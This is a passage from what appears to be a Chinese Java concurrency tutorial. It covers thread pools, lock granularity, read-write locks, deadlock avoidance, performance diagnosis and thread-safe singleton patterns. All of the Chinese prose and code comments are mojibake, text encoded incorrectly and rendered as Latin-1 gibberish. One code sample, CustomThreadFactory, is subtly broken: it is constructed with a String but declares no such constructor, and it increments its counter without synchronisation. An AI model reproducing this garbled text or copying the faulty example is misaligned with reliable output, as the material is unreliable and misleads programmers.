<p><strong>2. é¿å…è®¾ç½®çº¿ç¨‹ä¼˜å…ˆçº§</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸è¦ä¾èµ–çº¿ç¨‹ä¼˜å…ˆçº§ï¼Œè®©æ“ä½œç³»ç»Ÿå…¬å¹³è°ƒåº¦</span>
<span class="hljs-comment">// çº¿ç¨‹ä¼˜å…ˆçº§åœ¨ä¸åŒæ“ä½œç³»ç»Ÿä¸Šè¡¨ç°ä¸ä¸€è‡´</span>
</code></pre>
<p><strong>3. ä½¿ç”¨çº¿ç¨‹æ± </strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨çº¿ç¨‹æ± ï¼Œç¡®ä¿æ‰€æœ‰ä»»åŠ¡éƒ½æœ‰æ‰§è¡Œæœºä¼š</span>
<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;()
);
</code></pre>
<h4 data-id="heading-145">6.4 æ€§èƒ½é—®é¢˜</h4>
<h5 data-id="heading-146">6.4.1 CPUä½¿ç”¨ç‡è¿‡é«˜</h5>
<p><strong>åŸå› ï¼š</strong></p>
<ul>
<li>çº¿ç¨‹è¿‡å¤šï¼Œä¸Šä¸‹æ–‡åˆ‡æ¢é¢‘ç¹</li>
<li>æ­»å¾ªç¯æˆ–é•¿æ—¶é—´è®¡ç®—</li>
<li>é”ç«äº‰æ¿€çƒˆï¼Œå¤§é‡è‡ªæ—‹</li>
</ul>
<p><strong>è¯Šæ–­æ–¹æ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨ThreadMXBeanç›‘æ§CPUä½¿ç”¨</span>
<span class="hljs-type">ThreadMXBean</span> <span class="hljs-variable">threadBean</span> <span class="hljs-operator">=</span> ManagementFactory.getThreadMXBean();
<span class="hljs-type">long</span>[] allThreads = threadBean.getAllThreadIds();
ThreadInfo[] threadInfos = threadBean.getThreadInfo(allThreads);

<span class="hljs-keyword">for</span> (ThreadInfo threadInfo : threadInfos) {
    <span class="hljs-type">long</span> <span class="hljs-variable">cpuTime</span> <span class="hljs-operator">=</span> threadBean.getThreadCpuTime(threadInfo.getThreadId());
    System.out.println(threadInfo.getThreadName() + <span class="hljs-string">": "</span> + cpuTime + <span class="hljs-string">"ns"</span>);
}
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ul>
<li>å‡å°‘çº¿ç¨‹æ•°é‡</li>
<li>ä¼˜åŒ–ç®—æ³•ï¼Œå‡å°‘è®¡ç®—é‡</li>
<li>ä½¿ç”¨æ— é”æ•°æ®ç»“æ„ï¼Œå‡å°‘é”ç«äº‰</li>
</ul>
<h5 data-id="heading-147">6.4.2 çº¿ç¨‹é˜»å¡</h5>
<p><strong>åŸå› ï¼š</strong></p>
<ul>
<li>ç­‰å¾…IOæ“ä½œ</li>
<li>ç­‰å¾…é”</li>
<li>ç­‰å¾…å…¶ä»–çº¿ç¨‹</li>
</ul>
<p><strong>è¯Šæ–­æ–¹æ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨jstackæŸ¥çœ‹çº¿ç¨‹çŠ¶æ€</span>
<span class="hljs-comment">// BLOCKEDï¼šç­‰å¾…è·å–é”</span>
<span class="hljs-comment">// WAITINGï¼šç­‰å¾…å…¶ä»–çº¿ç¨‹</span>
<span class="hljs-comment">// TIMED_WAITINGï¼šè¶…æ—¶ç­‰å¾…</span>
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ul>
<li>ä½¿ç”¨å¼‚æ­¥IO</li>
<li>å‡å°‘é”çš„æŒæœ‰æ—¶é—´</li>
<li>ä½¿ç”¨è¶…æ—¶æœºåˆ¶</li>
</ul>
<h5 data-id="heading-148">6.4.3 é”ç«äº‰æ¿€çƒˆ</h5>
<p><strong>åŸå› ï¼š</strong></p>
<ul>
<li>é”ç²’åº¦å¤ªå¤§</li>
<li>çº¿ç¨‹æ•°é‡è¿‡å¤š</li>
<li>é”æŒæœ‰æ—¶é—´è¿‡é•¿</li>
</ul>
<p><strong>è¯Šæ–­æ–¹æ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç›‘æ§é”ç«äº‰æƒ…å†µ</span>
<span class="hljs-comment">// ä½¿ç”¨JProfileræˆ–VisualVMæŸ¥çœ‹é”ç«äº‰ç»Ÿè®¡</span>
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ul>
<li>å‡å°é”ç²’åº¦</li>
<li>ä½¿ç”¨è¯»å†™é”</li>
<li>ä½¿ç”¨æ— é”æ•°æ®ç»“æ„</li>
</ul>
<h5 data-id="heading-149">6.4.4 ä¸Šä¸‹æ–‡åˆ‡æ¢è¿‡å¤š</h5>
<p><strong>åŸå› ï¼š</strong></p>
<ul>
<li>çº¿ç¨‹æ•°é‡è¿‡å¤š</li>
<li>æ—¶é—´ç‰‡è®¾ç½®ä¸åˆç†</li>
</ul>
<p><strong>è¯Šæ–­æ–¹æ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨ç³»ç»Ÿå·¥å…·æŸ¥çœ‹ä¸Šä¸‹æ–‡åˆ‡æ¢æ¬¡æ•°</span>
<span class="hljs-comment">// Linux: vmstat 1</span>
<span class="hljs-comment">// Windows: æ€§èƒ½ç›‘è§†å™¨</span>
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ul>
<li>å‡å°‘çº¿ç¨‹æ•°é‡</li>
<li>ä½¿ç”¨çº¿ç¨‹æ± </li>
<li>åˆç†è®¾ç½®çº¿ç¨‹ä¼˜å…ˆçº§</li>
</ul>
<h2 data-id="heading-150">7. å¹¶å‘ç¼–ç¨‹æœ€ä½³å®è·µ</h2>
<h4 data-id="heading-151">7.1 çº¿ç¨‹å®‰å…¨è®¾è®¡åŸåˆ™</h4>
<h5 data-id="heading-152">7.1.1 ä¼˜å…ˆä½¿ç”¨ä¸å¯å˜å¯¹è±¡</h5>
<p>ä¸å¯å˜å¯¹è±¡å¤©ç„¶çº¿ç¨‹å®‰å…¨ï¼Œå› ä¸ºå¯¹è±¡åˆ›å»ºåä¸èƒ½è¢«ä¿®æ”¹ï¼Œå¤šä¸ªçº¿ç¨‹å¯ä»¥å®‰å…¨åœ°å…±äº«ã€‚</p>
<p><strong>ä¸å¯å˜å¯¹è±¡çš„ç‰¹å¾ï¼š</strong></p>
<ul>
<li>æ‰€æœ‰å­—æ®µéƒ½æ˜¯finalçš„</li>
<li>ç±»æœ¬èº«æ˜¯finalçš„ï¼ˆé˜²æ­¢è¢«ç»§æ‰¿ï¼‰</li>
<li>æ²¡æœ‰æä¾›ä¿®æ”¹å¯¹è±¡çŠ¶æ€çš„æ–¹æ³•</li>
<li>å¦‚æœå­—æ®µæ˜¯å¼•ç”¨ç±»å‹ï¼Œç¡®ä¿å¼•ç”¨çš„å¯¹è±¡ä¹Ÿæ˜¯ä¸å¯å˜çš„</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¯å˜ç±»</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ImmutablePoint</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> x;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> y;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ImmutablePoint</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> {
        <span class="hljs-built_in">this</span>.x = x;
        <span class="hljs-built_in">this</span>.y = y;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getX</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> x;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getY</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> y;
    }
    
    <span class="hljs-comment">// å¦‚æœéœ€è¦ä¿®æ”¹ï¼Œè¿”å›æ–°å¯¹è±¡</span>
    <span class="hljs-keyword">public</span> ImmutablePoint <span class="hljs-title function_">move</span><span class="hljs-params">(<span class="hljs-type">int</span> dx, <span class="hljs-type">int</span> dy)</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ImmutablePoint</span>(x + dx, y + dy);
    }
}

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-type">ImmutablePoint</span> <span class="hljs-variable">point</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ImmutablePoint</span>(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>);
<span class="hljs-comment">// å¤šä¸ªçº¿ç¨‹å¯ä»¥å®‰å…¨åœ°å…±äº«è¿™ä¸ªå¯¹è±¡</span>
<span class="hljs-comment">// ä¸éœ€è¦ä»»ä½•åŒæ­¥æœºåˆ¶</span>
</code></pre>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>çº¿ç¨‹å®‰å…¨ï¼šä¸éœ€è¦åŒæ­¥</li>
<li>ç®€å•ï¼šä¸éœ€è¦è€ƒè™‘å¹¶å‘é—®é¢˜</li>
<li>æ€§èƒ½å¥½ï¼šä¸éœ€è¦åŠ é”</li>
</ul>
<h5 data-id="heading-153">7.1.2 ä¼˜å…ˆä½¿ç”¨å¹¶å‘é›†åˆ</h5>
<p>ä¼˜å…ˆä½¿ç”¨å¹¶å‘é›†åˆï¼Œè€Œä¸æ˜¯åŒæ­¥åŒ…è£…çš„é›†åˆã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ¨èï¼šä½¿ç”¨å¹¶å‘é›†åˆ</span>
ConcurrentHashMap&lt;String, String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();
CopyOnWriteArrayList&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CopyOnWriteArrayList</span>&lt;&gt;();
BlockingQueue&lt;String&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="hljs-number">100</span>);
</code></pre>
<p><strong>ä¼˜åŠ¿ï¼š</strong> æ€§èƒ½å¥½ï¼Œé”ç²’åº¦å°ï¼Œé€‚åˆé«˜å¹¶å‘åœºæ™¯ã€‚</p>
<h5 data-id="heading-154">7.1.3 åˆç†ä½¿ç”¨é”</h5>
<p><strong>åŸåˆ™1ï¼šåªåœ¨å¿…è¦æ—¶ä½¿ç”¨é”</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åªåœ¨éœ€è¦åŒæ­¥çš„åœ°æ–¹åŠ é”</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">process</span><span class="hljs-params">()</span> {
    doSomething1();  <span class="hljs-comment">// ä¸éœ€è¦åŒæ­¥</span>
    
    <span class="hljs-keyword">synchronized</span> (lock) {
        count++;  <span class="hljs-comment">// åªæœ‰è¿™é‡Œéœ€è¦åŒæ­¥</span>
    }
    
    doSomething2();  <span class="hljs-comment">// ä¸éœ€è¦åŒæ­¥</span>
}
</code></pre>
<p><strong>åŸåˆ™2ï¼šä½¿ç”¨ç»†ç²’åº¦é”</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸åŒèµ„æºç”¨ä¸åŒçš„é”</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update1</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span> (lock1) { <span class="hljs-comment">/* åªé”èµ„æº1 */</span> }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">update2</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span> (lock2) { <span class="hljs-comment">/* åªé”èµ„æº2 */</span> }
}
</code></pre>
<p><strong>åŸåˆ™3ï¼šè¯»å¤šå†™å°‘ç”¨è¯»å†™é”</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">ReadWriteLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantReadWriteLock</span>();

<span class="hljs-keyword">public</span> String <span class="hljs-title function_">get</span><span class="hljs-params">(String key)</span> {
    lock.readLock().lock();  <span class="hljs-comment">// è¯»é”ï¼šå¤šä¸ªçº¿ç¨‹å¯ä»¥å¹¶å‘è¯»</span>
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">return</span> map.get(key);
    } <span class="hljs-keyword">finally</span> {
        lock.readLock().unlock();
    }
}
</code></pre>
<h5 data-id="heading-155">7.1.4 é¿å…è¿‡åº¦åŒæ­¥</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åªåœ¨éœ€è¦åŒæ­¥çš„åœ°æ–¹åŠ é”</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
    doSomething1();  <span class="hljs-comment">// ä¸éœ€è¦åŒæ­¥</span>
    
    <span class="hljs-keyword">synchronized</span> (lock) {
        sharedResource.update();  <span class="hljs-comment">// åªæœ‰è¿™é‡Œéœ€è¦åŒæ­¥</span>
    }
    
    doSomething2();  <span class="hljs-comment">// ä¸éœ€è¦åŒæ­¥</span>
}
</code></pre>
<h4 data-id="heading-156">7.2 çº¿ç¨‹æ± ä½¿ç”¨æœ€ä½³å®è·µ</h4>
<h5 data-id="heading-157">7.2.1 åˆç†é…ç½®å‚æ•°</h5>
<p>æ ¹æ®ä»»åŠ¡ç±»å‹è®¾ç½®çº¿ç¨‹æ•°ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">int</span> <span class="hljs-variable">cpuCount</span> <span class="hljs-operator">=</span> Runtime.getRuntime().availableProcessors();

<span class="hljs-comment">// CPUå¯†é›†å‹ï¼šçº¿ç¨‹æ•° = CPUæ ¸å¿ƒæ•° + 1</span>
<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    cpuCount + <span class="hljs-number">1</span>, cpuCount + <span class="hljs-number">1</span>, <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="hljs-number">1000</span>)
);

<span class="hljs-comment">// IOå¯†é›†å‹ï¼šçº¿ç¨‹æ•° = CPUæ ¸å¿ƒæ•° * 2</span>
<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    cpuCount * <span class="hljs-number">2</span>, cpuCount * <span class="hljs-number">4</span>, <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="hljs-number">1000</span>)
);
</code></pre>
<h5 data-id="heading-158">7.2.2 ä½¿ç”¨æœ‰æ„ä¹‰çš„çº¿ç¨‹åç§°</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomThreadFactory</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ThreadFactory</span> {
    <span class="hljs-keyword">private</span> String namePrefix;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">number</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;
    
    <span class="hljs-keyword">public</span> Thread <span class="hljs-title function_">newThread</span><span class="hljs-params">(Runnable r)</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r, namePrefix + <span class="hljs-string">"-"</span> + number++);
    }
}

<span class="hljs-comment">// ä½¿ç”¨</span>
<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="hljs-number">100</span>),
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomThreadFactory</span>(<span class="hljs-string">"è®¢å•å¤„ç†"</span>)
);
</code></pre>
<h5 data-id="heading-159">7.2.3 æ­£ç¡®å¤„ç†å¼‚å¸¸</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åœ¨ä»»åŠ¡å†…éƒ¨æ•è·å¼‚å¸¸</span>
executor.execute(() -&gt; {
    <span class="hljs-keyword">try</span> {
        processTask();
    } <span class="hljs-keyword">catch</span> (Exception e) {
        System.err.println(<span class="hljs-string">"ä»»åŠ¡å¼‚å¸¸: "</span> + e.getMessage());
    }
});
</code></pre>
<h5 data-id="heading-160">7.2.4 ä¼˜é›…å…³é—­çº¿ç¨‹æ± </h5>
<pre><code class="hljs language-java" lang="java">executor.shutdown();  <span class="hljs-comment">// åœæ­¢æ¥å—æ–°ä»»åŠ¡</span>
<span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">if</span> (!executor.awaitTermination(<span class="hljs-number">60</span>, TimeUnit.SECONDS)) {
        executor.shutdownNow();  <span class="hljs-comment">// å¼ºåˆ¶å…³é—­</span>
    }
} <span class="hljs-keyword">catch</span> (InterruptedException e) {
    executor.shutdownNow();
    Thread.currentThread().interrupt();
}
</code></pre>
<h4 data-id="heading-161">7.3 é”ä½¿ç”¨æœ€ä½³å®è·µ</h4>
<h5 data-id="heading-162">7.3.1 å‡å°‘é”çš„æŒæœ‰æ—¶é—´</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åªåœ¨éœ€è¦çš„åœ°æ–¹åŠ é”</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">process</span><span class="hljs-params">()</span> {
    doSomething1();  <span class="hljs-comment">// ä¸éœ€è¦åŒæ­¥</span>
    
    <span class="hljs-keyword">synchronized</span> (lock) {
        sharedResource.update();  <span class="hljs-comment">// åªæœ‰è¿™é‡Œéœ€è¦åŒæ­¥</span>
    }
    
    doSomething2();  <span class="hljs-comment">// ä¸éœ€è¦åŒæ­¥</span>
}
</code></pre>
<h5 data-id="heading-163">7.3.2 é¿å…åµŒå¥—é”</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ‰€æœ‰æ–¹æ³•æŒ‰ç›¸åŒé¡ºåºè·å–é”ï¼Œé¿å…æ­»é”</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method1</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span> (lock1) {  <span class="hljs-comment">// å…ˆè·å–lock1</span>
        <span class="hljs-keyword">synchronized</span> (lock2) {  <span class="hljs-comment">// å†è·å–lock2</span>
            <span class="hljs-comment">// ä»£ç </span>
        }
    }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method2</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span> (lock1) {  <span class="hljs-comment">// å…ˆè·å–lock1ï¼ˆé¡ºåºä¸€è‡´ï¼‰</span>
        <span class="hljs-keyword">synchronized</span> (lock2) {  <span class="hljs-comment">// å†è·å–lock2</span>
            <span class="hljs-comment">// ä»£ç </span>
        }
    }
}
</code></pre>
<h5 data-id="heading-164">7.3.3 ä½¿ç”¨è¯»å†™é”</h5>
<p>è¯»å¤šå†™å°‘åœºæ™¯ä½¿ç”¨è¯»å†™é”ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">ReadWriteLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantReadWriteLock</span>();

<span class="hljs-keyword">public</span> String <span class="hljs-title function_">get</span><span class="hljs-params">(String key)</span> {
    lock.readLock().lock();  <span class="hljs-comment">// è¯»é”ï¼šå¤šä¸ªçº¿ç¨‹å¯å¹¶å‘</span>
    <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">return</span> map.get(key);
    } <span class="hljs-keyword">finally</span> {
        lock.readLock().unlock();
    }
}
</code></pre>
<h5 data-id="heading-165">7.3.4 é¿å…æ­»é”</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. ä½¿ç”¨é”é¡ºåºï¼šæ‰€æœ‰çº¿ç¨‹æŒ‰ç›¸åŒé¡ºåºè·å–é”</span>
<span class="hljs-comment">// 2. ä½¿ç”¨è¶…æ—¶é”ï¼šé¿å…æ— é™ç­‰å¾…</span>
<span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
<span class="hljs-keyword">if</span> (lock.tryLock(<span class="hljs-number">100</span>, TimeUnit.MILLISECONDS)) {
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// ä»£ç </span>
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}
</code></pre>
<h4 data-id="heading-166">7.4 æ€§èƒ½ä¼˜åŒ–æœ€ä½³å®è·µ</h4>
<h5 data-id="heading-167">7.4.1 å‡å°‘ä¸Šä¸‹æ–‡åˆ‡æ¢</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åˆç†è®¾ç½®çº¿ç¨‹æ•°ï¼Œä½¿ç”¨çº¿ç¨‹æ± </span>
<span class="hljs-type">int</span> <span class="hljs-variable">threadCount</span> <span class="hljs-operator">=</span> Runtime.getRuntime().availableProcessors() + <span class="hljs-number">1</span>;
<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    threadCount, threadCount, <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="hljs-number">1000</span>)
);
</code></pre>
<h5 data-id="heading-168">7.4.2 å‡å°‘é”ç«äº‰</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨ç»†ç²’åº¦é”ã€æ— é”æ•°æ®ç»“æ„ã€è¯»å†™é”</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
<span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
ConcurrentHashMap&lt;String, String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();
</code></pre>
<h5 data-id="heading-169">7.4.3 åˆç†ä½¿ç”¨æ— é”ç¼–ç¨‹</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä½¿ç”¨Atomicç±»ã€ConcurrentHashMapç­‰æ— é”æ•°æ®ç»“æ„</span>
<span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
ConcurrentHashMap&lt;String, String&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();
</code></pre>
<h5 data-id="heading-170">7.4.4 ç›‘æ§å’Œè°ƒä¼˜</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç›‘æ§çº¿ç¨‹æ± çŠ¶æ€</span>
executor.getPoolSize();      <span class="hljs-comment">// å½“å‰çº¿ç¨‹æ•°</span>
executor.getActiveCount();   <span class="hljs-comment">// æ´»è·ƒçº¿ç¨‹æ•°</span>
executor.getQueue().size();  <span class="hljs-comment">// é˜Ÿåˆ—å¤§å°</span>
</code></pre>
<h2 data-id="heading-171">8. å¸¸è§å¹¶å‘åœºæ™¯å®ç°</h2>
<h4 data-id="heading-172">8.1 å•ä¾‹æ¨¡å¼ï¼ˆçº¿ç¨‹å®‰å…¨ï¼‰</h4>
<h5 data-id="heading-173">8.1.1 é¥¿æ±‰å¼</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton1</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Singleton1</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton1</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton1</span><span class="hljs-params">()</span> {}
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton1 <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> instance;
    }
}
</code></pre>
<h5 data-id="heading-174">8.1.2 æ‡’æ±‰å¼ï¼ˆsynchronizedï¼‰</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton2</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Singleton2 instance;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">synchronized</span> Singleton2 <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) {
            instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton2</span>();
        }
        <span class="hljs-keyword">return</span> instance;
    }
}
</code></pre>
<h5 data-id="heading-175">8.1.3 åŒé‡æ£€æŸ¥é”å®šï¼ˆDCLï¼‰</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton3</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">volatile</span> Singleton3 instance;  <span class="hljs-comment">// å¿…é¡»volatile</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton3 <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) {  <span class="hljs-comment">// ç¬¬ä¸€æ¬¡æ£€æŸ¥</span>
            <span class="hljs-keyword">synchronized</span> (Singleton3.class) {
                <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) {  <span class="hljs-comment">// ç¬¬äºŒæ¬¡æ£€æŸ¥</span>
                    instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton3</span>();
                }
            }
        }
        <span class="hljs-keyword">return</span> instance;
    }
}
</code></pre>
<h5 data-id="heading-176">8.1.4 é™æ€å†…éƒ¨ç±»ï¼ˆæ¨èï¼‰</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton4</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Holder</span> {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Singleton4</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton4</span>();
    }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton4 <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> Holder.instance;
    }
}
</code></pre>
<h5 data-id="heading-177">8.1.5 æšä¸¾æ–¹å¼ï¼ˆæœ€ç®€å•ï¼‰</h5>
